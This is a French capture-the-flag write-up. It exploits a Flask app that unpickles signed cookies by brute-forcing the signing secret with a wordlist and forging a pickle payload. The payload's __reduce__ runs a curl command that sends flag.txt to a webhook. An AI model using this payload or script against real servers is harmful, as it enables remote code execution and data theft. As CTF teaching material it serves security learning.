
# pas un bon nom

> On a trouvé le blog personnel d'un membre de l'organisation, On sait qu'il cache des infos intéressantes dans un dossier flag.txt mais on a pas réussi à accéder au fichier, on nous a dit qu'il adore les cookies typiques de Lurenberg !


## Reconnaissance

En se connectant au challenge, on tombe sur cette page nous demandant de nous identifier :

![](../images/home.jpg)

Après avoir rafraichis la page une fois, nous arrivons sur la page d'accueil.

![](../images/logged.png)

Par chance nous avons accès au code source, ce qui nous donne de précieuses indications de où commencer à chercher.

```python
from flask import Flask, request, make_response, render_template, send_from_directory
import hashlib
import base64
import pickle
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
SECRET_KEY = os.environ.get('SECRET_KEY')

def sign_data(data):
    return hashlib.sha256((data + SECRET_KEY).encode()).hexdigest()

def serialize_data(data):
    return base64.b64encode(pickle.dumps(data)).decode()

def deserialize_data(data):
    return pickle.loads(base64.b64decode(data))

@app.route('/public/<path:path>')
def send_report(path):
    return send_from_directory('public', path)

@app.route('/')
def index():
    try:
        signed_cookie = request.cookies.get('signed_cookie')
        
        if signed_cookie:
            cookie_data, signature = signed_cookie.split('.')
            if hashlib.sha256((cookie_data + SECRET_KEY).encode()).hexdigest() == signature:
                result = deserialize_data(cookie_data)
                return render_template('success.html', result=result)
            else:
                return render_template('error.html', message="Signature invalide!"), 403
        else:
            initial_data = "You're either with us or against us"
            serialized_data = serialize_data(initial_data)
            signed_data = sign_data(serialized_data)
            signed_cookie_value = f"{serialized_data}.{signed_data}"
            response = make_response(render_template('welcome.html'))
            response.set_cookie('signed_cookie', signed_cookie_value)
            return response
    except Exception as e:
        return render_template('error.html', message=str(e)), 500

@app.errorhandler(404)
def page_not_found(e):
    return render_template('error.html', message="Page non trouvée!"), 404

@app.errorhandler(500)
def internal_server_error(e):
    return render_template('error.html', message="Erreur interne du serveur!"), 500

@app.errorhandler(Exception)
def handle_exception(e):
    return render_template('error.html', message="Une erreur est survenue!"), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

On a ici quelques passages très intéressants.

L'utilisation de pickle, qui rend notre code vulnérable à l'exécution de code côté serveur au moment de la désérialisation.

```python
import pickle
```

On peut voir ici la logique de signature, sérialisation et désérialisation du cookie utilisateur. 

```python
def sign_data(data):
    return hashlib.sha256((data + SECRET_KEY).encode()).hexdigest()

def serialize_data(data):
    return base64.b64encode(pickle.dumps(data)).decode()

def deserialize_data(data):
    return pickle.loads(base64.b64decode(data))
```

Ainsi que le mécanisme de vérification de la signature du cookie.

```python
@app.route('/')
def index():
    try:
        signed_cookie = request.cookies.get('signed_cookie')
        
        if signed_cookie:
            cookie_data, signature = signed_cookie.split('.')
            if hashlib.sha256((cookie_data + SECRET_KEY).encode()).hexdigest() == signature:
                result = deserialize_data(cookie_data)
                return render_template('success.html', result=result)
            else:
                return render_template('error.html', message="Signature invalide!"), 403
        else:
            initial_data = "You're either with us or against us"
            serialized_data = serialize_data(initial_data)
            signed_data = sign_data(serialized_data)
            signed_cookie_value = f"{serialized_data}.{signed_data}"
            response = make_response(render_template('welcome.html'))
            response.set_cookie('signed_cookie', signed_cookie_value)
            return response
    except Exception as e:
        return render_template('error.html', message=str(e)), 500
```

On apprend alors :
	- Le cookie est désérialisé avec Pickle
	- La signature est la concaténation hashé en SHA256 de la donnée initiale + un secret

Partant de là on peut alors construire un script d'exploitation.

## Exploitation + Exfiltration

On peut construire un petit script d'exploitation pour essayer de chainer les vulnérabilité et extraire le flag.

Dans un premier temps, on va essayer de retrouver le secret utilisé pour signer les cookies.

```python
import requests
import hashlib
import base64
import pickle
import os
  
TARGET =  'http://127.0.0.1:5000/'
WORDLIST_PATH =  './rockyou-75.txt'

def  bruteforce_secret():
	initial_cookie = requests.get(TARGET).cookies
	signed_cookie = initial_cookie.get('signed_cookie')
	initial_data, initial_signature = signed_cookie.split('.')
  

	with  open(WORDLIST_PATH, 'r', encoding='latin-1') as f:
		wordlist = f.read().splitlines()
  
	for password in wordlist:
		signature = hashlib.sha256((initial_data + password).encode()).hexdigest()
		if signature == initial_signature:
			print("Secret key found:", password)
			return password
		print("Trying:", password)
	print("No secret key in the wordlist.")
	return  None  
  
def  main():
	secret = bruteforce_secret()
  
if  __name__  ==  '__main__':
	main()
```

Ce script récupère le cookie du challenge pour tenter de le bruteforce en local. On utilise ici la wordlist rockyou-75.txt

On exécute on retrouve bien le secret.

![](../images/secret.png)

Maintenant, il ne nous reste plus qu'à forger une requête qui renvoie le contenu de flag.txt vers un webhook et le tour est joué !

```python
import requests
import hashlib
import base64
import pickle
import os
  
TARGET =  'http://127.0.0.1:5000/'
WEBHOOK_URL =  'https://webhook.site/unique-id'
WORDLIST_PATH =  './rockyou-75.txt'  

class  Malicious:
	def  __reduce__(self):
		# Send flag to webhook
		command =  f'curl {WEBHOOK_URL} --data-urlencode "flag=`cat flag.txt`"'
		return (os.system, (command,))
  
def  serialize_data(data):
	return base64.b64encode(pickle.dumps(data)).decode()
  
def  bruteforce_secret():
	initial_cookie = requests.get(TARGET).cookies
	signed_cookie = initial_cookie.get('signed_cookie')
	initial_data, initial_signature = signed_cookie.split('.')  

	with  open(WORDLIST_PATH, 'r', encoding='latin-1') as f:
		wordlist = f.read().splitlines()
  
	for password in wordlist:
		signature = hashlib.sha256((initial_data + password).encode()).hexdigest()
		if signature == initial_signature:
			print("Secret key found:", password)
			return password
		print("Trying:", password)
	print("No secret key in the wordlist.")
	return  None  
  
def  final_malicious_cookie(secret):
	#forging cookie
	malicious_obj = Malicious()
	serialized_data = serialize_data(malicious_obj)
	signature = hashlib.sha256((serialized_data + secret).encode()).hexdigest()
	return  f"{serialized_data}.{signature}"
  
def  send_malicious_cookie(signed_cookie):
	#send payload to app
	cookies = {'signed_cookie': signed_cookie}
	response = requests.get(TARGET, cookies=cookies)
	return response.text
  
def  main():
	secret = bruteforce_secret()
	if secret:
		signed_cookie = final_malicious_cookie(secret)
		result = send_malicious_cookie(signed_cookie)
		print("Server response:", result)
  
if  __name__  ==  '__main__':
	main()
```

On récupère alors le flag directement dans notre webhook : 

![](../images/flag.png)

```ECTF{Why_4r3_w3_us1ng_cust0m_s4n1t1z4t10n?}```
